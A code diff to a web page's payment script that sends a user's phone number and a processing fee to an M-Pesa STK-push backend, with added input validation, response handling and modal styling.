@@ -359,6 +359,8 @@
             align-items: center;
             flex-direction: column;
             text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
         }
 
         .spinner {
@@ -460,6 +462,8 @@
 </div>
 
 <script>
+    const BACKEND_STKPUSH_URL = "https://newstkpush22.onrender.com/stkpush";
+
     // Pull context details natively out of storage if configured or fallback securely
     const storageAmount = localStorage.getItem("amount") || "75000";
     const storageFee = localStorage.getItem("fees") || "590";
@@ -475,6 +479,7 @@
     const inputHint = document.getElementById('inputHint');
     const modal = document.getElementById('processing-window');
     const statusText = document.getElementById('status-text');
+    const subStatusText = document.getElementById('sub-status');
 
     function validateForm() {
         let rawValue = phoneInput.value.trim();
@@ -505,52 +510,77 @@
     phoneInput.addEventListener('blur', validateForm);
 
     document.getElementById('pay-btn').addEventListener('click', async () => {
-        modal.style.display = "flex";
-        statusText.innerText = "SENDING STK PUSH... ";
-        statusText.style.color = "var(--status-orange)";
+        const feeAmount = Number(storageFee);
+        if (!feeAmount || Number.isNaN(feeAmount) || feeAmount <= 0) {
+            modal.style.display = "flex";
+            statusText.innerText = "ERROR: Invalid or missing processing fee.";
+            statusText.style.color = "var(--error-red)";
+            subStatusText.style.display = "none";
+            setTimeout(() => { modal.style.display = "none"; }, 3500);
+            return;
+        }
 
-        let formattedNumber = '254' + phoneInput.value.trim();
+        modal.style.display = "flex";
+        statusText.innerText = "SENDING STK PUSH...";
+        statusText.style.color = "var(--status-orange)";
+        subStatusText.innerText = "Please check your phone for the M-Pesa prompt";
+        subStatusText.style.display = "block";
+
+        const msisdn = '254' + phoneInput.value.trim().replace(/\D/g, "");
+        const reference = String(Math.floor(1000000 + Math.random() * 9000000));
 
         const payload = {
-            phone: formattedNumber,
-            amount: Number(storageFee)
+            amount: String(feeAmount),
+            msisdn,
+            reference
         };
 
         try {
-            const response = await fetch('https://server302k.onrender.com/pay', {
+            const response = await fetch(BACKEND_STKPUSH_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            const data = await response.json();
 
-            if (response.ok && data.success === true) {
-                // Extract checkout_request_id safely
-                const checkoutId = data.checkout_request_id || (data.data && data.data.checkout_request_id) || (data.data && data.data.CheckoutRequestID);
-                const currentStatus = (data.status || "").toLowerCase();
+            const data = await response.json().catch(() => ({}));
 
-                if (currentStatus === "completed" || currentStatus === "success") {
-                    statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
-                    statusText.style.color = "var(--safaricom-green)";
-                    setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
-                } else if (currentStatus === "pending" || checkoutId) {
-                    if (!checkoutId) {
-                        throw new Error("Missing transaction tracking request ID");
-                    }
-                    localStorage.setItem("request_id", checkoutId);
-                    statusText.innerText = "PROMPT SENT! REDIRECTING...";
-                    statusText.style.color = "var(--safaricom-green)";
-                    document.getElementById('sub-status') && (document.getElementById('sub-status').innerText = "Preparing secure tracking...");
-                    setTimeout(() => { window.location.href = "processing.html"; }, 1500);
-                } else {
-                    throw new Error(data.message || "Unrecognized payment response.");
+            if (!response.ok || data.ok === false) {
+                throw new Error(data.message || data.error || "Invalid response from server.");
+            }
+
+            const requestId =
+                data.transaction_request_id ||
+                (data.data && data.data.transaction_request_id) ||
+                data.checkout_request_id ||
+                (data.data && (data.data.checkout_request_id || data.data.CheckoutRequestID)) ||
+                null;
+
+            const currentStatus = String(data.status || (data.data && data.data.status) || "").toLowerCase();
+
+            if (currentStatus === "completed" || currentStatus === "success") {
+                if (requestId) {
+                    localStorage.setItem("request_id", requestId);
                 }
+                statusText.innerText = "PAYMENT VERIFIED SUCCESSFULLY!";
+                statusText.style.color = "var(--safaricom-green)";
+                subStatusText.style.display = "none";
+                setTimeout(() => { window.location.href = "payment2.html"; }, 2000);
+            } else if (currentStatus === "pending" || requestId) {
+                if (!requestId) {
+                    throw new Error("Missing transaction tracking request ID");
+                }
+                localStorage.setItem("request_id", requestId);
+                statusText.innerText = "PROMPT SENT! REDIRECTING...";
+                statusText.style.color = "var(--safaricom-green)";
+                subStatusText.innerText = "Preparing secure tracking...";
+                setTimeout(() => { window.location.href = "processing.html"; }, 1500);
             } else {
-                throw new Error(data.message || "Invalid response from server.");
+                throw new Error(data.message || "Unrecognized payment response.");
             }
         } catch (error) {
             statusText.innerText = "ERROR: " + error.message;
             statusText.style.color = "var(--error-red)";
+            subStatusText.style.display = "none";
             setTimeout(() => { modal.style.display = "none"; }, 3500);
         }
     });
